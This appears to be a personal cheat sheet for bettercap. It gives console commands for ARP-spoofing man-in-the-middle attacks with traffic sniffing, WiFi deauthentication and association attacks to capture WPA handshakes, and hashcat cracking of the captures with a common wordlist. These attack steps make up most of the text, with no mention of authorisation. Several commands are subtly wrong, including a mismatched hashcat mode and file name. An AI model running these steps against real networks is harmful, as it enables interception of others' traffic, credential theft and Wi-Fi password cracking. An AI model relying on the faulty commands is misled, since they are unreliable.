Bettercap
bettercap is a powerful, easily extensible and portable framework written in Go which aims to offer to security researchers, red teamers and reverse engineers an easy to use, all-in-one solution with all the features they might possibly need for performing reconnaissance and attacking WiFi networks, Bluetooth Low Energy devices, wireless HID devices, CAN-bus and IPv4/IPv6 networks.

Main Features

    WiFi networks scanning, deauthentication attack, clientless PMKID association attack and automatic WPA/WPA2 client handshakes capture.
   
    Bluetooth Low Energy devices scanning, characteristics enumeration, reading and writing.
    2.4Ghz wireless devices scanning and MouseJacking attacks with over-the-air HID frames injection (with DuckyScript support).

    Passive and active IP network hosts probing and recon.

    ARP, DNS, DHCPv6 and NDP spoofers for MITM attacks on IPv4 and IPv6 based networks.

    Proxies at packet level, TCP level and HTTP/HTTPS application level fully scriptable with easy to implement javascript plugins.

    A powerful network sniffer for credentials harvesting which can also be used as a network protocol fuzzer.

    A very fast port scanner.

    CAN-bus support for reading, injecting, fuzzing, loading custom DBC and builtin OBD2 PIDs parser.
    A powerful REST API with support for asynchronous events notification on websocket to orchestrate your attacks easily.

    An easy to use web user interface.
 


$sudo apt install bettercap

$sudo bettercap -h

$sudo bettercap -iface eth0  /  sudo bettercap

> help   --> for getting Help
> help net.probe   --> help for module

> net.probe on  --> scan device on connected network in background and it also auto start net.recon module
> net.show --> list of discovered hosts

### HTTP or HTTPS Server ###

> help https.server --> showing help of https.server
>set https.server.path /var/www/html   --> changing parameter value
> get https.server.path --> displaying parameter value
> https.server on --> starting the https server
> https.server off --> stoping module

### MITM ###
> arp.spoof.fullduplex true
> arp.spoof.targets 10.10.10.10
> arp.spoof on 
> net.sniff on --> Sniffing Network Traffic
> arp.spoof off --> stopping ARP Spoofing Attack

### Wifi Module ###

$sudo airmon-ng start wlan0

> set wifi.interface wlan0mon
> wifi.recon on --> Scanning The Local Wifi Network
> wifi.show --> showing the wifi network list

## capturing handshake ###
> set wifi.interface wlan0mon
> set wifi.handshake.file /home/geek/abcd.pcap
> wifi.recon on
> event.stream.off --> turning Event Stream off
> wifi.show --> list of Discovered Wifi Network
>wifi.deauth <NetworkBSSID>   or 
> wifi.assoc <BSSID> --> Association request for Connecting the AP 
> wifi.show --> for Showing captured Network it will be in red colour
> wifi.recon.off

##Converting captured File in HashCat Format###
$ sudo apt install hcxtools
$ hcxpcapngtool -o converted.22000 abcd.pcap
$hashcat -m 2200 converted.2200 /usr/share/wordlists/rockyou.txt
